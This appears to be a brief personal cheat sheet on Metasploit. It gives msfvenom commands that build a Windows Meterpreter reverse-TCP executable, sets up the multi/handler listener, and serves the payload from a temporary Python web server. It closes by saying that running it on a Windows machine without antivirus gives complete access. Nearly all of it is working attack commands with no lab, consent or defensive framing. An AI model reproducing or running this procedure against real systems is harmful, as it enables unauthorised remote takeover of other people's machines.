# Metasploit

**Payload**, the code to be executed on the victim machine.

```bash
msfconsole
```

```bash
msfvenom -p <payload> LHOST=<your_ip> LPORT=<your_port> -f <format> -o <filename>
```

`msfvenom` tool used to generate payloads.

-p used to specify type of payload. (ie reverse shell)
-f format of the file (exe, elf, raw)


```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<myip> LPORT=4444 -f exe -o payload.exe
```

generates the payload.

```bash
use multi/handler # inside metasploit console
set payload windows/meterpreter/reverse_tcp
show options

```

with no antivirus for windows.

create tmp website
```
python -m http.server 8080
```

You have to get the payload and run it on windows. Now you have complete access to the windows machine.

---
